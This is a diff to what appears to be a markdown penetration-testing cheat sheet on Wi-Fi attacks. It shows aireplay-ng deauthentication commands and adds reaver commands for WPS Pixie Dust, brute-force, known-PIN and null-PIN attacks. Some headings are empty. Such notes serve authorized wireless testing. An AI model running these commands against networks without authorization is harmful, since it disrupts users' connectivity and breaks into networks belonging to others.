@@ -20,15 +20,41 @@ iwconfig wlan0 channel <channel>
 Catch beacon with ESSID
 ```
 aireplay-ng -0 <deauth number> -a <AP MAC> <interface> 
-aireplay-ng -0 <deauth number> -a <AP MAC> -c <Client MAC> <interface> # Some clients ignore broadcast deauthentications. If this is the case, you will need to send a deauthentication directed at the particular client.
+aireplay-ng -0 <deauth number> -a <AP MAC> -c <Client MAC> <interface> #Some clients ignore broadcast deauthentications. If this is the case, you will need to send a deauthentication directed at the particular client.
 ```
 
 
 ## WEP attack
 
 
+## WPS attack
+Dependencies: reaver
+### Custom PIN association 
+ 
+### Pixie Dust attack 
+```
+ reaver -i <interface> -b <AP_MAC> -K
+```
+ 
+### Bruteforce PIN attack 
+```
+sudo reaver -i <interface> -b <AP_MAC>
+```
+ 
+### Known PINs attack
+```
+reaver -i <interface> -b <AP_MAC> -p <PIN>
+```
+ 
+### Null PIN attack 
+```
+reaver -i <interface> -b <AP_MAC> -p "" -N
+```
+
+## WPA attack
 
 
+## WPA Enterprise
 
 
 
